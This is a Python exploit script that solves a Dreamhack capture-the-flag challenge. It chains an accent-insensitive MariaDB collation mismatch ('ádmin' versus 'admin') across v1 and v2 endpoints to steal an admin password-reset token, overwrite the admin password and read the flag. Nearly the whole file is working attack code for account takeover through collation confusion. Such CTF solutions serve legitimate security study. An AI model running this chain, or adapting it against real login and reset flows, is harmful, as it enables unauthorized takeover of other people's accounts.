#!/usr/bin/env python3
"""
playing-with-login exploit

Vulnerability: MariaDB 11.3.2 default collation utf8mb4_uca1400_ai_ci is accent-insensitive.
- v1 signup uses Python in-memory dict (accent-sensitive)
- v2 request-password-change uses DB query (accent-insensitive)
- v2 change-password actually changes password before returning 501

Attack chain:
1. v1 signup "ádmin" -> creates in-memory user (Python dict key != "admin")
2. v2 request-password-change "ádmin" -> DB matches 'admin', token for admin, link posted to inbox["ádmin"]
3. v1 login as "ádmin" -> session["user"] = "ádmin"
4. v1 mypage -> read inbox["ádmin"] -> get v2 reset token
5. v2 change-password with token -> changes admin's DB password (despite 501)
6. v2 login as "admin" with new password
7. v2 mypage -> inbox["admin"] -> FLAG
"""

import requests
import re
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://host3.dreamhack.games:8381"
ACCENT_ADMIN = "\u00e1dmin"  # ádmin
NEW_PASSWORD = "pwned123"

s = requests.Session()

print(f"[*] Target: {TARGET}")

# Step 1: Sign up "ádmin" via v1
print(f"[1] Signing up '{ACCENT_ADMIN}' via v1...")
r = s.post(f"{TARGET}/v1/signup", data={
    "username": ACCENT_ADMIN,
    "password": NEW_PASSWORD
})
print(f"    Status: {r.status_code}")

# Step 2: Request v2 password change for "ádmin"
# DB query matches 'admin' (accent-insensitive), token created for admin
# Link posted to inbox["ádmin"]
print(f"[2] Requesting v2 password change for '{ACCENT_ADMIN}'...")
r = s.post(f"{TARGET}/v2/request-password-change", data={
    "username": ACCENT_ADMIN
})
print(f"    Status: {r.status_code} (501 expected - side effects already done)")

# Step 3: Login as "ádmin" via v1
print(f"[3] Logging in as '{ACCENT_ADMIN}' via v1...")
r = s.post(f"{TARGET}/v1/login", data={
    "username": ACCENT_ADMIN,
    "password": NEW_PASSWORD
})
print(f"    Status: {r.status_code}")

# Step 4: Visit mypage to get the reset token
print(f"[4] Reading mypage (inbox of '{ACCENT_ADMIN}')...")
r = s.get(f"{TARGET}/v1/mypage")
print(f"    Status: {r.status_code}")

# Extract the v2 change-password link
token_match = re.search(r'/v2/change-password/([A-Za-z0-9_-]+)', r.text)
if not token_match:
    print("[-] Failed to find v2 reset token in mypage!")
    print("    Page content snippet:")
    print(r.text[:2000])
    sys.exit(1)

reset_path = token_match.group(0)
reset_token = token_match.group(1)
print(f"    Found reset token: {reset_token[:20]}...")

# Step 5: Use v2 change-password to change admin's DB password
print(f"[5] Changing admin's DB password via v2 (will return 501 but password changes)...")
r = s.post(f"{TARGET}{reset_path}", data={
    "new_password": NEW_PASSWORD,
    "confirm_password": NEW_PASSWORD
})
print(f"    Status: {r.status_code} (501 expected)")

# Step 6: Login as admin via v2 (uses DB)
s2 = requests.Session()
print(f"[6] Logging in as 'admin' via v2...")
r = s2.post(f"{TARGET}/v2/login", data={
    "username": "admin",
    "password": NEW_PASSWORD
})
print(f"    Status: {r.status_code}")

# Step 7: Visit mypage to get flag
print(f"[7] Reading admin's mypage for flag...")
r = s2.get(f"{TARGET}/v2/mypage")
print(f"    Status: {r.status_code}")

# Extract flag
flag_match = re.search(r'DH\{[^}]+\}', r.text)
if flag_match:
    flag = flag_match.group(0)
    print(f"\n[+] FLAG FOUND: {flag}")
else:
    print("[-] Flag not found in admin mypage!")
    print("    Page content:")
    print(r.text[:3000])
